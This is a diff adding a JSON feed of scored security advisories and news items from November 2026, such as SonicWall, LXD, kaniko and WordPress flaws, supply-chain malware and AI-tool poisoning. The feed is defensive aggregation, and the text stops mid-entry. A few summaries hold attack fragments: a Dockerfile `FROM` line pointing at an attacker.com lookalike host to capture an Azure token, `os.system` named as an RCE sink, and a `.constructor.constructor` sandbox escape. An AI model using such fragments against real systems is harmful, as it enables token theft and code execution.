@@ -1,0 +1,1980 @@
+[
+  {
+    "title": "SonicWall SonicOS SSLVPN: SonicWall SonicOS SSLVPN Use of Single-factor Authentication Vulnerability",
+    "link": "https://nvd.nist.gov/vuln/detail/CVE-2026-19868",
+    "summary": "SonicWall SonicOS SSLVPN contains a use of single-factor authentication vulnerability that may allow a user with valid credentials for an alternate authentication method to bypass SAML authentication controls. Successful exploitation may also bypass SAML-enforced multi-factor authentication (MFA). Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+    "published": "2026-11-06T12:00:00+00:00",
+    "source": "CISA KEV",
+    "category": "government",
+    "source_weight": 1.3,
+    "matched_keywords": [
+      "saml",
+      "mfa",
+      "sonicwall"
+    ],
+    "score": 1.9265475129005958,
+    "bm25": 0.6126941518111315,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [
+      "CVE-2026-19868"
+    ],
+    "packages": [],
+    "corroboration": 2,
+    "other_sources": [
+      {
+        "source": "CISA Advisories",
+        "link": "https://www.cisa.gov/news-events/alerts/2026/11/06/cisa-adds-one-known-exploited-vulnerability-catalog",
+        "published": "2026-11-06T12:00:00+00:00",
+        "category": "government"
+      }
+    ],
+    "id": "953902135b60"
+  },
+  {
+    "title": "LXD has restricted project bypass leading to arbitrary command execution",
+    "link": "https://github.com/advisories/GHSA-47w9-6r3f-938g",
+    "summary": "Affected: github.com/canonical/lxd. Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv ### Summary Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`. ### Details Instance snapshots ignore the `restricted.containers.lowlevel=block` setting; allowing for arbitrary command execution on the Incus server by abusing lowlevel hooks such as `raw.lxc` and `raw.qemu`. As snapshots can be moved from one server to another, a malicious instance+snapshot can b",
+    "published": "2026-11-06T19:51:26Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "github",
+      "qemu"
+    ],
+    "score": 1.4400592961154177,
+    "bm25": 0.2701663903286075,
+    "severity": "critical",
+    "cvss": 9.9,
+    "cves": [
+      "CVE-2026-12411",
+      "CVE-2026-28385",
+      "CVE-2026-9639"
+    ],
+    "packages": [
+      "github.com/canonical/lxd"
+    ],
+    "corroboration": 11,
+    "other_sources": [
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-7mr3-28h5-m5vx",
+        "published": "2026-11-06T19:51:16Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-qx75-2p3r-pwm5",
+        "published": "2026-11-06T19:51:00Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-j93m-3j9p-m5m8",
+        "published": "2026-11-06T19:37:14Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-pjff-c2wc-f6jm",
+        "published": "2026-11-06T19:36:55Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-fmc8-p6q7-75cc",
+        "published": "2026-11-06T19:36:37Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-vghh-5rfx-xhq8",
+        "published": "2026-11-06T19:36:07Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-jpf8-86f3-wp38",
+        "published": "2026-11-06T18:53:57Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-9j25-mm2h-2f76",
+        "published": "2026-11-06T18:45:51Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-3gq2-x4qg-p4g6",
+        "published": "2026-11-06T18:29:18Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 go",
+        "link": "https://github.com/advisories/GHSA-hhf9-qw4v-72xp",
+        "published": "2026-11-05T17:40:59Z",
+        "category": "advisory"
+      }
+    ],
+    "id": "38f2adf1d5d7"
+  },
+  {
+    "title": "Shai-Hulud Descendant Surfaces in Malicious Ruby Gem That Steals Credentials and Poisons AI Tools",
+    "link": "https://socket.dev/blog/shai-hulud-descendant-malicious-ruby-gem?utm_medium=feed",
+    "summary": "A malicious Ruby gem runs a credential-stealing worm during installation, poisons AI coding tools, and can wipe files when a stolen GitHub token is revoked.",
+    "published": "2026-11-06T17:11:11+00:00",
+    "source": "Socket Blog",
+    "category": "advisory",
+    "source_weight": 1.2,
+    "matched_keywords": [
+      "ruby",
+      "gem ",
+      "github",
+      "token",
+      "credential",
+      "shai-hulud"
+    ],
+    "score": 1.4262256279615946,
+    "bm25": 0.42117982862123526,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 2,
+    "other_sources": [
+      {
+        "source": "StepSecurity",
+        "link": "https://www.stepsecurity.io/blog/malicious-files-find-what-supply-chain-attacks-leave-behind-in-your-github-repositories-and-on-developer-machines",
+        "published": "2026-11-04T15:00:37+00:00",
+        "category": "research"
+      }
+    ],
+    "id": "12cd4e88ca00"
+  },
+  {
+    "title": "Installing the Fix for an Exploited WordPress Flaw Can Expose Some Sites One Last Time",
+    "link": "https://thehackernews.com/2026/11/installing-fix-for-exploited-wordpress.html",
+    "summary": "Some WordPress sites can still be attacked while they install the fix for an actively exploited flaw, according to Umut Bayram, the Picus Security researcher who found it. The update that installs the fix still unpacks its files using the site's old, unpatched code, so an attacker who strikes at the right moment can run code on the server. The researcher advises blocking web access to the",
+    "published": "2026-11-06T16:08:38+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "actively exploited"
+    ],
+    "score": 0.6761980893321459,
+    "bm25": 0.4953832156279457,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "319e7df558d1"
+  },
+  {
+    "title": "Microsoft Paint RCE Fix Now Available, but Windows Update Won't Deliver It",
+    "link": "https://thehackernews.com/2026/11/microsoft-paint-rce-fix-now-available.html",
+    "summary": "A fix for CVE-2026-83844, a remote code execution flaw in Windows Paint, is now in the Microsoft Store. Paint gets this fix only through a Store update, not through Windows updates. The fixed build, 11.2609.401.0, was the newest Paint build in all ten countries The Hacker News checked today. The flaw is an out-of-bounds read that could let an attacker run code over a network. Microsoft rates",
+    "published": "2026-11-06T12:06:43+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "windows",
+      "rce",
+      "cve-"
+    ],
+    "score": 0.3352096218785372,
+    "bm25": 0.29404352796362915,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [
+      "CVE-2026-83844"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0b7161df55d9"
+  },
+  {
+    "title": "Hackers Hide Linux Backdoor in Control Web Panel Server to Execute Commands Without Logs",
+    "link": "https://thehackernews.com/2026/11/hackers-hide-linux-backdoor-in-control.html",
+    "summary": "A backdoor has been found hiding in the web server that runs Control Web Panel (CWP), a free panel for managing Linux hosting servers, researchers at QiAnXin's XLab said this week. The backdoored web server executes commands that attackers send via web requests, and those requests never appear in its access logs. Installing it takes root access, so the attackers must already control the server.",
+    "published": "2026-11-06T05:58:54+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "backdoor"
+    ],
+    "score": 0.22849984994993564,
+    "bm25": 0.20043846486836459,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "97fd8de188fc"
+  },
+  {
+    "title": "OSAC operator: Kubeconfig credential-plugin execution and SSRF in console proxy",
+    "link": "https://github.com/advisories/GHSA-5w5g-j6hw-6p8f",
+    "summary": "Affected: github.com/osac-project/osac-operator. ### Impact The console-proxy's RemoteConfigResolver parses kubeconfig data from Kubernetes Secrets using clientcmd.RESTConfigFromKubeConfig without sanitizing the resulting rest.Config. A kubeconfig containing an exec plugin stanza (under users[].user.exec) is faithfully preserved. When rest.TransportFor later builds the HTTP transport for the upstream WebSocket connection, client-go invokes the exec plugin \u2014 spawning an arbitrary process as the osac-console-proxy service account. This allows remote code execution inside the console-proxy pod for any principal that can create or modif",
+    "published": "2026-11-06T18:12:40Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "go ",
+      "github",
+      "kubernetes",
+      "credential",
+      "ssrf"
+    ],
+    "score": 0.6696267384358379,
+    "bm25": 0.41851671152239867,
+    "severity": "high",
+    "cvss": 0.0,
+    "cves": [
+      "CVE-2026-62284"
+    ],
+    "packages": [
+      "github.com/osac-project/osac-operator"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "acfd16228fc0"
+  },
+  {
+    "title": "Fake security tools on GitHub push backdoors and infostealers",
+    "link": "https://www.bleepingcomputer.com/news/security/fake-security-tools-on-github-push-backdoors-and-infostealers/",
+    "summary": "Cybersecurity professionals are being targeted with infected security projects on GitHub that deploy a backdoor and information stealer malware. [...]",
+    "published": "2026-11-06T18:46:52+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "github",
+      "stealer",
+      "backdoor"
+    ],
+    "score": 0.5119161462428,
+    "bm25": 0.3953020434307336,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "b432728a569b"
+  },
+  {
+    "title": "Experts Demonstrate Barracuda Email Security Gateway Chain Enabling Root Access Without Login",
+    "link": "https://thehackernews.com/2026/11/experts-demonstrate-barracuda-email.html",
+    "summary": "Two flaws in Barracuda's Email Security Gateway, an email-filtering appliance, can be chained to run commands on it as root, its highest level of access, with no login required. The company released patches on Monday, and the security firm watchTowr detailed the attack chain on Thursday. One flaw, CVE-2026-116606, is an authorization bypass. An unauthenticated attacker can use it to restore a",
+    "published": "2026-11-06T05:39:10+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "barracuda",
+      "cve-"
+    ],
+    "score": 0.42574297430372465,
+    "bm25": 0.2654226059896261,
+    "severity": "high",
+    "cvss": 8.0,
+    "cves": [
+      "CVE-2026-116606"
+    ],
+    "packages": [],
+    "corroboration": 2,
+    "other_sources": [
+      {
+        "source": "The Hacker News",
+        "link": "https://thehackernews.com/2026/11/barracuda-flaws-could-be-chained-to.html",
+        "published": "2026-11-03T15:59:19+00:00",
+        "category": "aggregator"
+      }
+    ],
+    "id": "985aa680f8ad"
+  },
+  {
+    "title": "OpenAI's new GPT-6 Cyber AI finds 81 Firefox flaws, 948 Linux bugs",
+    "link": "https://www.bleepingcomputer.com/news/security/openais-new-gpt-6-cyber-ai-finds-81-firefox-flaws-948-linux-bugs/",
+    "summary": "OpenAI has revealed GPT-6 Cyber, a new artificial intelligence model that has discovered 81 previously unknown high-severity Firefox vulnerabilities and developed working exploits for 948 distinct Linux kernel flaws. [...]",
+    "published": "2026-11-06T20:24:19+00:00",
+    "source": "BleepingComputer",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "kernel",
+      "firefox"
+    ],
+    "score": 0.16742115516584574,
+    "bm25": 0.1366703307476292,
+    "severity": "high",
+    "cvss": 7.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "3df1af76d776"
+  },
+  {
+    "title": "kaniko can send the build's Azure (Entra ID) access token to lookalike ACR registry hosts",
+    "link": "https://github.com/advisories/GHSA-5q7h-w9jf-cx97",
+    "summary": "Affected: github.com/chainguard-dev/kaniko. ### Summary kaniko before v1.25.20 can send a Microsoft Entra ID (Azure AD) access token for Azure Resource Manager to a registry host an attacker controls. A Dockerfile that references an image on a lookalike host, such as `FROM x.azurecr.io.attacker.com/img`, is enough. The build needs no `RUN` instruction and never has to push. The flaw is in the Azure Container Registry (ACR) credential helper, `github.com/chrismellard/docker-credential-acr-env`. kaniko links it into the executor and warmer (the built-in helper) and also builds it as the standalone `docker-credential-acr-env` binary. The",
+    "published": "2026-11-05T17:48:54Z",
+    "source": "GHSA \u2014 go",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "github",
+      "container",
+      "docker",
+      "azure",
+      "entra",
+      "token",
+      "credential"
+    ],
+    "score": 1.052816558034781,
+    "bm25": 0.6364176084838917,
+    "severity": "critical",
+    "cvss": 9.3,
+    "cves": [
+      "CVE-2026-105769"
+    ],
+    "packages": [
+      "github.com/chainguard-dev/kaniko"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0290a11674ef"
+  },
+  {
+    "title": "Zyxel GS1900 Patch Fails to Block Zero-Day Exploit Allowing Root Command Execution",
+    "link": "https://thehackernews.com/2026/11/zyxel-gs1900-patch-fails-to-block-zero.html",
+    "summary": "Zyxel GS1900 network switches that received the vendor's earlier fix for an actively exploited flaw are still open to the exploit attackers used, researchers at Binarly found. The exploit lets anyone who can reach a switch's web management interface run commands on it without logging in. Zyxel has released new firmware for 10 GS1900 models that closes the hole. The earlier fix is the 2.90",
+    "published": "2026-11-05T07:06:33+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "zero-day",
+      "exploit",
+      "actively exploited"
+    ],
+    "score": 0.975,
+    "bm25": 1.0,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "d2b8633e1a6f"
+  },
+  {
+    "title": "Apple Multiple Products: Apple Multiple Products Improper Authentication Vulnerability",
+    "link": "https://nvd.nist.gov/vuln/detail/CVE-2024-27834",
+    "summary": "Apple iOS, iPadOS, macOS, Safari, tvOS and watchOS 10.5 contain an improper authentication vulnerability which could allow an attacker with arbitrary read and write capability to bypass pointer authentication. Required action: Apply mitigations in accordance with vendor instructions, ensuring compliance with CISA\u2019s BOD 26-04 Prioritizing Security Updates Based on Risk (see URL in Notes) guidance and CISA\u2019s \u201cForensics Triage Requirements\u201d (see URL in Notes). Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines.",
+    "published": "2026-11-05T05:17:04+00:00",
+    "source": "CISA KEV",
+    "category": "government",
+    "source_weight": 1.3,
+    "matched_keywords": [
+      "macos",
+      "apple",
+      "safari"
+    ],
+    "score": 0.8070581995279145,
+    "bm25": 0.3079995706583884,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [
+      "CVE-2024-27834"
+    ],
+    "packages": [],
+    "corroboration": 2,
+    "other_sources": [
+      {
+        "source": "The Hacker News",
+        "link": "https://thehackernews.com/2026/11/hackers-exploit-patched-apple-flaw-to.html",
+        "published": "2026-11-05T05:17:04+00:00",
+        "category": "aggregator"
+      }
+    ],
+    "id": "ff75aca6bd8a"
+  },
+  {
+    "title": "OpenSSH Issues Emergency Fix for Flaw Letting Long Passwords Bypass SSH Auth on Alpine Linux",
+    "link": "https://thehackernews.com/2026/11/openssh-issues-emergency-fix-for-flaw.html",
+    "summary": "Attackers can log in to accounts that have no password, such as SSH key-only accounts, on some Alpine Linux servers running the standard openssh-server package. They need network access to the server, an account name, and a password between 257 and 1,024 bytes long. OpenSSH, which rates the flaw critical, released version 10.6p2 today to block it. Alpine has published fixed packages for every",
+    "published": "2026-11-05T16:42:46+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "alpine",
+      "ssh",
+      "openssh"
+    ],
+    "score": 0.4647592243368907,
+    "bm25": 0.3972301062708468,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "90a9e74aa19b"
+  },
+  {
+    "title": "ThreatsDay: Apache OFBiz RCE, DreamHost Breach, DeFi Site Hijacks + 17 More Stories",
+    "link": "https://thehackernews.com/2026/11/threatsday-apache-ofbiz-rce-dreamhost.html",
+    "summary": "How much damage can someone do without breaking much? Quite a lot, it seems. A stolen login can open doors across several systems. A trusted setting can be used to lock people out. Even a simple file copy can reach places it shouldn't. And while new tools are helping find security holes faster, some important systems are still taking months, sometimes over a year, to get patched. Not exactly a",
+    "published": "2026-11-05T14:41:10+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "rce",
+      "breach"
+    ],
+    "score": 0.2350078657313323,
+    "bm25": 0.2061472506415196,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "7d3fdba5d291"
+  },
+  {
+    "title": "Banks: Unsafe importlib.import_module of attacker-controlled Tool.import_path in CompletionExtension allows RCE",
+    "link": "https://github.com/advisories/GHSA-64vx-6h2c-rjh7",
+    "summary": "Affected: banks. ## Summary `banks` parses `Tool` JSON objects from the rendered body of `{% completion %}` blocks and later resolves their `import_path` field through `importlib.import_module(...)` + `getattr(...)` to obtain the callable that handles a tool call. There is no allowlist or sanitization on `import_path`, so any importable Python attribute (e.g. `os.system`, `subprocess.getoutput`) can be selected. When the LLM emits a `tool_calls` entry whose `function.name` matches the attacker-supplied tool name, the resolved callable is invoked with kwargs decoded from `tool_call.function.argument",
+    "published": "2026-11-05T17:51:02Z",
+    "source": "GHSA \u2014 pip",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "python",
+      "rce"
+    ],
+    "score": 0.22500000000000003,
+    "bm25": 0.0,
+    "severity": "high",
+    "cvss": 7.5,
+    "cves": [
+      "CVE-2026-61536"
+    ],
+    "packages": [
+      "banks"
+    ],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "84f429b5d95e"
+  },
+  {
+    "title": "Critical Rails Flaw Lets Attackers Write Server Files via Crafted ImageMagick Uploads",
+    "link": "https://thehackernews.com/2026/11/critical-rails-flaw-lets-attackers.html",
+    "summary": "A critical flaw in Ruby on Rails could allow an unauthenticated attacker to write arbitrary files on an app's server by uploading a crafted file if the app processes uploads using ImageMagick. The Rails project disclosed the flaw in&nbsp;an advisory&nbsp;and fixed it in versions 8.1.4.1 and 8.0.5.2. The flaw is in Active Storage, the part of Rails that handles file uploads. Some apps store",
+    "published": "2026-11-04T12:07:04+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "ruby"
+    ],
+    "score": 0.19581784933406476,
+    "bm25": 0.2510485247872626,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "eeeb8b0c17d4"
+  },
+  {
+    "title": "Risky Bulletin: Hackers brick Chinese EVs in Russia",
+    "link": "https://risky.biz/RBNEWS629/",
+    "summary": "Hackers brick Chinese EVs in Russia, a second wave of hacks defrost European supermarket freezers, the US boots Acronis from government networks and the major distros patch a Linux kernel RCE.",
+    "published": "2026-11-04T00:53:51+00:00",
+    "source": "Risky Business News",
+    "category": "aggregator",
+    "source_weight": 1.1,
+    "matched_keywords": [
+      "linux",
+      "kernel",
+      "rce"
+    ],
+    "score": 0.17258870198064782,
+    "bm25": 0.1445120710364276,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "eb7dd74bdef7"
+  },
+  {
+    "title": "Google Issues Patches for Critical Android Flaw That Could Allow RCE Without User Interaction",
+    "link": "https://thehackernews.com/2026/11/google-patches-critical-android-flaw.html",
+    "summary": "A critical Android flaw could allow an attacker to run code on a phone without any user action remotely, Google said in its&nbsp;November security bulletin. The flaw, CVE-2026-58868, affects Android 14 through 17. Phones get the fix with security patch level 2026-11-01 or later, which phone makers and carriers send on their own schedules. As of November 4, Google's bulletin did not report",
+    "published": "2026-11-04T07:46:15+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "rce",
+      "cve-"
+    ],
+    "score": 0.12371976276009765,
+    "bm25": 0.1586150804616637,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [
+      "CVE-2026-58868"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "226d22a42341"
+  },
+  {
+    "title": "PolinRider Returns: Hijacked npm Packages Use Ethereum Blockchain to Conceal Malware Infrastructure",
+    "link": "https://www.ox.security/blog/polinrider-returns-hijacked-npm-packages-use-ethereum-blockchain-to-conceal-malware-infrastructure/",
+    "summary": "Overview OX Security researchers identified malicious releases of legitimate npm packages compromised in a campaign linked to the PolinRider malware family. The injected code uses the Ethereum blockchain as a dead drop for command-and-control (C2) infrastructure. When an affected package is imported, a hidden loader queries public Ethereum RPC endpoints to retrieve a C2 IP [&#8230;] The post PolinRider Returns: Hijacked npm Packages Use Ethereum Blockchain to Conceal Malware Infrastructure appeared first on OX Security .",
+    "published": "2026-11-04T20:59:06+00:00",
+    "source": "OX Security",
+    "category": "research",
+    "source_weight": 0.9,
+    "matched_keywords": [
+      "npm"
+    ],
+    "score": 0.744019858415996,
+    "bm25": 0.6256022833527893,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "c15ec382d2e8"
+  },
+  {
+    "title": "APT29-Linked Hackers Hijack Web Analytics Script to Deliver iOS and Android Exploits",
+    "link": "https://thehackernews.com/2026/11/apt29-linked-hackers-hijack-web.html",
+    "summary": "The Russia-linked threat actor known as APT29 is presumed to be behind a large-scale watering hole campaign targeting iOS and Android users through compromised websites, fake domains, and a supply chain attack involving a Ukrainian web analytics service called Plerdy SEO Tracker. \"The injected JavaScript code collects browser and device attributes,\" Sekoia researchers Amaury-Jacques Gar\u00e7on and",
+    "published": "2026-11-04T14:27:52+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "javascript",
+      "supply chain"
+    ],
+    "score": 0.6130367522202028,
+    "bm25": 0.6627424348326516,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "f4b7ff866caa"
+  },
+  {
+    "title": "CISA Confirms Hackers Exploiting WordPress Core Flaw During Software Upgrades",
+    "link": "https://thehackernews.com/2026/11/cisa-confirms-hackers-exploiting.html",
+    "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added a security flaw in WordPress Core to the Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation. The high-severity vulnerability, tracked as CVE-2026-119977 (CVSS score: 8.1), is a case of Time-of-check Time-of-use (TOCTOU) race condition that could be exploited to achieve arbitrary code",
+    "published": "2026-11-04T05:43:11+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "kev",
+      "cve-",
+      "cvss"
+    ],
+    "score": 0.43457705724075446,
+    "bm25": 0.6208243674867922,
+    "severity": "high",
+    "cvss": 7.5,
+    "cves": [
+      "CVE-2026-119977"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "0f2962e63e08"
+  },
+  {
+    "title": "SonicWall Won't Patch EoL GMS Flaws That Could Expose Files, Alter Database Records",
+    "link": "https://thehackernews.com/2026/11/sonicwall-wont-patch-eol-gms-flaws-that.html",
+    "summary": "SonicWall has warned of two vulnerabilities impacting end-of-life Global Management System (GMS) systems that it said will not be patched. Details of the security flaws, which affect SonicWall GMS 9.5.2 and earlier versions, are below - CVE-2026-109593 (CVSS score: 9.1) - An unauthenticated file read vulnerability that could allow an attacker with network access to read internal GMS files,",
+    "published": "2026-11-04T17:00:38+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "sonicwall",
+      "cve-",
+      "cvss"
+    ],
+    "score": 0.27311320564736596,
+    "bm25": 0.30345911738596215,
+    "severity": "high",
+    "cvss": 8.0,
+    "cves": [
+      "CVE-2026-109593"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "28cc7a562c85"
+  },
+  {
+    "title": "China-Aligned Hackers Hijack Sogou Input Method DNS Requests to Deploy DarkVigil Backdoor",
+    "link": "https://thehackernews.com/2026/11/china-aligned-hackers-hijack-sogou.html",
+    "summary": "A China-aligned threat actor known as SlippyNunchucks has been attributed to a Domain Name System (DNS) hijacking operation abusing insecure HTTP communications in Windows versions of Sogou Input Method as part of a surveillance campaign designed to deploy an implant called DarkVigil (aka FDMTP). The campaign, observed starting July 1, 2026, is assessed to have targeted organizations and",
+    "published": "2026-11-04T11:24:31+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "windows",
+      "dns",
+      "backdoor"
+    ],
+    "score": 0.22368401724616482,
+    "bm25": 0.30227569898130385,
+    "severity": "high",
+    "cvss": 8.5,
+    "cves": [],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "73251ea6fbbb"
+  },
+  {
+    "title": "Elo JavaScript emitter has sandbox escape to arbitrary Node.js / browser code execution via unfiltered `.constructor` member access",
+    "link": "https://github.com/advisories/GHSA-33r5-xmm8-v6x5",
+    "summary": "Affected: @enspirit/elo. ### Summary An unauthenticated attacker who controls a string passed to any Elo JavaScript-emission path \u2014 `defaultFormats.elo.parse()`, the `bin/elo` CLI, or the live browser playground at `elo-lang.org/try` \u2014 can execute arbitrary code in the host JavaScript runtime. A payload built from the `.constructor.constructor` chain compiles, without modification, to a live `Function` invocation in the emitted JavaScript, escaping any sandbox assumption around \"Elo is a safe data/DSL language.\" ### Vulnerable sink and root cause Three interacting sites in `src/` produce the bug at commit `749af7b`",
+    "published": "2026-11-03T17:53:42Z",
+    "source": "GHSA \u2014 npm",
+    "category": "advisory",
+    "source_weight": 1.0,
+    "matched_keywords": [
+      "node",
+      "javascript"
+    ],
+    "score": 1.2401212232038894,
+    "bm25": 0.6195867813550896,
+    "severity": "critical",
+    "cvss": 9.8,
+    "cves": [
+      "CVE-2026-44265",
+      "CVE-2026-44266",
+      "CVE-2026-44267"
+    ],
+    "packages": [
+      "@enspirit/elo"
+    ],
+    "corroboration": 3,
+    "other_sources": [
+      {
+        "source": "GHSA \u2014 npm",
+        "link": "https://github.com/advisories/GHSA-7w38-ggh5-v542",
+        "published": "2026-11-03T17:51:30Z",
+        "category": "advisory"
+      },
+      {
+        "source": "GHSA \u2014 npm",
+        "link": "https://github.com/advisories/GHSA-x9rp-7wh3-2rj5",
+        "published": "2026-11-03T17:48:09Z",
+        "category": "advisory"
+      }
+    ],
+    "id": "cb851f750dee"
+  },
+  {
+    "title": "Attackers Exploit Critical Siemens IoT2050 Flaw to Plant Remote Command Backdoors",
+    "link": "https://thehackernews.com/2026/11/attackers-exploit-critical-siemens.html",
+    "summary": "A maximum-severity security flaw impacting Siemens SIMATIC IoT2050 Advanced devices has come under active exploitation, VulnCheck has revealed. The vulnerability, tracked as CVE-2026-58115 (CVSS score: 10.0), is a case of missing authentication for a critical function that could be exploited by an unauthenticated remote attacker to run arbitrary code. \"SIMATIC IoT2050 Advanced devices running",
+    "published": "2026-11-03T05:34:41+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "exploit",
+      "cve-",
+      "cvss"
+    ],
+    "score": 0.3487246210885852,
+    "bm25": 0.596110463399291,
+    "severity": "critical",
+    "cvss": 9.5,
+    "cves": [
+      "CVE-2026-58115"
+    ],
+    "packages": [],
+    "corroboration": 1,
+    "other_sources": [],
+    "id": "b9ba4e436fc8"
+  },
+  {
+    "title": "Red Hat Patches 9.8-Rated Linux TCP RCE Flaw While Ubuntu Releases Fixes for Testing",
+    "link": "https://thehackernews.com/2026/11/red-hat-patches-98-rated-linux-tcp-rce.html",
+    "summary": "Fixed kernels for a&nbsp;use-after-free vulnerability in the Linux kernel's IPv4 TCP code&nbsp;are now available for Red Hat Enterprise Linux 8, 9, and 10, while Ubuntu's fixes for its three newest long-term-support releases remain in its opt-in testing channel with no date for a regular update. The flaw, tracked as CVE-2026-98432, can be reached by a remote, unauthenticated attacker and can",
+    "published": "2026-11-03T11:23:53+00:00",
+    "source": "The Hacker News",
+    "category": "aggregator",
+    "source_weight": 0.7,
+    "matched_keywords": [
+      "linux",
+      "kernel",
+      "ubuntu",
+      "rce",
+      "cve-"
+    ],
+    "score": 0.1614186161737788,
+    "bm25": 0.28319055469084004,
+    "severity": "critical",
+    "cvss": 9.0,
+    "cves": [
+      "CVE-2026-98432"
+    ],
+    "packages": [],
+    "corroboration": 1,
